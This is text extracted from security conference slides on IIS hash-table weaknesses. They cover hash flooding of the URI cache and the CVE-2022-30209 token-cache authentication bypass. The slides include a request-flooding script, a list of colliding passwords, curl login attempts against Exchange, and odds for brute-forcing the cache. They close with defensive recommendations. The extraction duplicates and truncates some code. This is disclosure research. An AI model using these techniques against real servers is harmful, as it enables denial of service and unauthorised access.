Hash Function
“No.”
by Alech & Zeri from their awesome talk at 28c3
1
DWORD TREE_HASH_TABLE::CalcHash(wchar_t *pwsz) {
2
DWORD dwHash = 0;
3
4 
for (  ;  *pwsz;  ++pwsz)
5 
dwHash = dwHash * 101 + *pwsz;
6
7 
return ((dwHash * 1103515245 + 12345) >> 16)
8 
| ((dwHash * 69069 + 1) & 0xffff0000);
9 }
Variant of DJBX33A
Equivalent Substrings
ℎ33 "PS" = 331 × asc("P") + 330 × asc("S") = 2723
ℎ33 "Q2" = 331 × asc("Q") + 330 × asc("2") = 2723
= 331 × ℎ33 "Q2" + 330 × asc("A")
= ℎ33 "Q2A"
ℎ33 "PSA" = 331 × ℎ33 "PS" + 330 × asc("A")
ℎ33 "PSPS" = ℎ33 "PSQ2" = ℎ33 "Q2PS" = ℎ33 "Q2Q2"
ℎ101 "XR39M083" = ℎ101 "B94OS5T0" = ℎ101 "R04I46KN" = ℎ101 "..."
1
import requests
2
from itertools import product
3
4
MAGIC_TABLE = [
5
"XR39M083", "B94OS5T0", "R04I46KN", "DIO137NY", # ...
6
]
7
8   for i in product(MAGIC_TABLE, repeat=8):
9     request.get( "http://iis/" + "".join(i) )
1   import requests
2   from itertools import product
3
4   MAGIC_TABLE = [
5     "XR39M083", "B94OS5T0", "R04I46KN", "DIO137NY", # ...
6   ]
7  
8   for i in product(MAGIC_TABLE, repeat=8):
9     request.get( "http://iis/" + "".join(i) )
Obstacles to make this not-
so-practical…
1.
The increment is too slow
2. The Cache Scavenger
• A thread used to delete unused records every 30 seconds
1
bool TREE_HASH_TABLE::InsertRecord(TREE_HASH_TABLE *this, void *record) {
2 
3 
/* omitting */
4  
5 
while ( i /AAAA/BBBB/CCCC/DDDD/EEEE/FFFF/GGGG/HHHH/...")
xx
1.
InsertRecord(key="/AAAA/BBBB/CCCC/DDDD/EEEE/FFFF/GGGG/HHHH/...")
http://server/AAAA/BBBB/CCCC/DDDD/EEEE/FFFF/GGGG/HHHH/…
▶ SEARCH
▶ INSERT
SEARCH
1.
FindRecord(key="/AAAA/BBBB/CCCC/DDDD/EEEE/FFFF/GGGG/HHHH/...")
xx
1.
InsertRecord(key="/AAAA/BBBB/CCCC/DDDD/EEEE/FFFF/GGGG/HHHH/...")
2.
AddNodeInternal(key="/AAAA/BBBB/CCCC/DDDD/EEEE/FFFF/GGGG/HHHH")
3.
AddNodeInternal(key="/AAAA/BBBB/CCCC/DDDD/EEEE/FFFF/GGGG/")
4.
AddNodeInternal(key="/AAAA/BBBB/CCCC/DDDD/EEEE/FFFF")
5.
AddNodeInternal(key="/AAAA/BBBB/CCCC/DDDD/EEEE")
6.
AddNodeInternal(key="/AAAA/BBBB/CCCC/DDDD")
7.
AddNodeInternal(key="/AAAA/BBBB/CCCC")
8.
AddNodeInternal(key="/AAAA/BBBB")
9.
AddNodeInternal(key="/AAAA")
http://server/AAAA/BBBB/CCCC/DDDD/EEEE/FFFF/GGGG/HHHH/…
▶ INSERT
▶ SEARCH
1
bool TREE_HASH_TABLE::InsertRecord(TREE_HASH_TABLE *this, void *record) {
2 
3 
/* omitting */
4  
5 
while ( i 
hello.aspx
The user saw…
http://orange.local/hello.aspx?id=Orange
http://orange.local/hello.aspx?id=Orange
IIS Authentication Bypass
CVE-2022-30209
For a Protected Area
Th1s-1s-@-Sup3r-Str0ng-P@33w0rD!
DI1D8XF4
T9433W0N
R04K85R8
OR7SHSQM
4IDF7LAU
T9ILKRJO
DIO376UC
29WM5WPU
XRXNHYS8
I0XVSRY7
4J4F29DY
BA55FF5B
VJ5QUDCJ
XS9B66QE
I1BICTG1
DJH24HH4
OSNADCSM
FSNPV263
91T4TLRP
91UKBHBR
2AWCRJ5Z
I212PEZ3
XT2A3HD6
MK4CSS3L
OT844EAG
92D4O9UT
FTM3BRCO
FTNJ0N3Q
4KT30N6F
92TWJEJM
OU131W48
KC4U2MRT
VL62A63D
93DWE2MQ
OUFLIRN9
MLK1OC5L
VLKKY1ME
2CONWY0F
03R2ZXJM
AND MORE
All Passwords are Valid
You might be thinking…
• What's the root cause?
• How do I get those passwords?
• What kind of scenarios are vulnerable?
The login result cache…?
• Logon is an expensive operation so… Let's cache it!
• IIS by default cache windows security tokens for password-based 
authentications such as Basic Auth or Client-Certificate Auth…
• A scavenger deletes unused records every 15 minutes :(
• Use LKRHash Table
Initializing a LKRHash Table
CLKRHashTable::CLKRHashTable(
this,
"TOKEN_CACHE",  // An identifier for debugging
pfnExtractKey,   // Extract key from record
pfnCalcKeyHash,  // Calculate hash signature of key
pfnEqualKeys,    // Compare two keys
pfnAddRefRecord, // AddRef in FindKey, etc
4.0,             // Bound on the average chain length.
1,               // Initial size of hash table.
0,               // Number of subordinate hash tables.
0
// Allow multiple identical keys?
);
fnCalcKeyHash for Token Cache
1  DWORD pfnCalcKeyHash(wchar_t *Username, wchar_t *Password) {
2
DWORD i = 0, j = 0;
3
4
for (  ;  *Username;  ++Username)
5
i = i * 101 + *Username;
6
7      for (  ;  *Password;  ++Password)
8
j = j * 101 + *Password;
9
10
return i ^ j;
11  }
fnEqualKeys for Token Cache
1  DWORD pfnEqualKeys(TokenKey *this, TokenKey *that) {
2
3
if ( this->LoginMethod != that->GetLogonMethod() ||
4
strcmp(this->Username, that->GetUserNameW()) ||
5
strcmp(this->Username, that->GetUserNameW()) ) {
6
return KEY_MISMATCH;
7      }
8
9
return KEY_MATCH;
10  }
1  DWORD pfnEqualKeys(TokenKey *this, TokenKey *that) {
2
3      if ( this->LoginMethod != that->GetLogonMethod() ||
4
strcmp(this->Username, that->GetUserNameW()) ||
5
strcmp(this->Username, that->GetUserNameW()) ) {
6          return KEY_MISMATCH;
7      }
8
9      return KEY_MATCH;
10  }
Why did it compare the username twice?
1  DWORD pfnEqualKeys(TokenKey *this, TokenKey *that) { 
2
3      if ( this->LoginMethod != that->GetLogonMethod() ||
4           strcmp(this->Username, that->GetUserNameW()) ||
5           strcmp(this->Username, that->GetUserNameW()) ) {
6          return KEY_MISMATCH;
7      }
8
9      return KEY_MATCH;
10  }
Would you like to guess why it compares twice?
pfnCalcKeyHash vs. pfnEqualKeys
Username and Password are involved
Only Username is involved…
You can reuse another logged-in
token with random passwords
1. Every password has the success rate of Τ
1 232
2. Unlimited attempts during the 15-minutes time window.
Winning the Lottery
1.
Increase the odds of the collision!
2. Exploit without user interaction - Regain the initiative!
3. Defeat the 15-minutes time window!
1. Increase the Probability
• 4.2 billions hashes under the key space of a 32-Bit Integer
• LKRHash Table uses LCGs to scramble the result
• The LCG is not one-to-one mapping under the key space of a 32-bit integer
DWORD CLKRHashTable::_CalcKeyHash(IHttpCacheKey *key) {
DWORD dwHash = this->pfnCalcKeyHash(key)
return ((dwHash * 1103515245 + 12345) >> 16)
| ((dwHash * 69069 + 1) & 0xffff0000);
}
13% of Success Rate
13% of Key Space
by pre-computing the password
2. Regain the Initiative
• The "Connect As" feature is commonly used in Virtual Hosting 
or Web Hosting
IIS auto-logon the user you specify
while spawning a new process
Experiment Run!
• Windows Server is able to handle about 1,800 logins per-second
• Running for all day
- (1800 × 86400) ÷ (232 × (1 − 0.13)) = 4.2%
The odds are already higher than an SSR 
(Superior Super Rare) in Gacha Games…
Experiment Run!
• Windows Server is able to handle about 1,800 logins per-second
• Running for all day
- (1800 × 86400) ÷ (232 × (1 − 0.13)) = 4.2%
• Running for 5 days
- (1800 × 86400 × 5) ÷ (232 × (1 − 0.13)) = 20.8%
• Running for 12 days - (1800 × 86400 × 10) ÷ (232 × (1 − 0.13)) = 49.9%
• Running for 24 days - (1800 × 86400 × 24) ÷ (232 × (1 − 0.13)) = 100%
3. Defeat the Time Window!
• In sophisticated modern applications, it's common to see:
1.
background daemons that check the system health
2. background cron-jobs that poke internal APIs periodically
3. Defeat the Time Window!
• The token will be cached in the memory forever if:
1.
The operations attach a credential
2. The time gap between each access is less than 15 minutes
Microsoft Exchange Server
Microsoft Exchange Server
• Active Monitoring Service:
• An enabled-by-default service to check the health of all services
• Check Outlook Web Access and ActiveSync with a credential 
every 10 minutes!
$ curl "https://ex01/Microsoft-Server-ActiveSync/" \
-u "PI:EMAIL:000000"
HTTP/2 401
$ curl "https://ex01/Microsoft-Server-ActiveSync/" \
-u "PI:EMAIL:PASSWD"
HTTP/2 401
$ curl "https://ex01/Microsoft-Server-ActiveSync/" \
-u "PI:EMAIL:KVBVDE"
HTTP/2 505
❌
❌
✔️
KVBVDE
Outline
1.
Introduction
2. Our Research
3. Vulnerabilities 
4. Recommendations
Recommendation
• About the Hash Table design
• Use PRFs such as SipHash/HighwayHash
• About the Cache Design
• The inconsistency is the king.
• Learn from history
• ❌ Limit the input size
• ❌ A secret to randomize the Hash Function
Future Works
• Locate the correct bucket index by Timeless Timing Attack?
• A more efficient Hash-Flooding way on CachUriModule?
• Cache Poisoning on Static Files (Kernel-Mode)?
orange_8361
PI:EMAIL
Thanks!
https://blog.orange.tw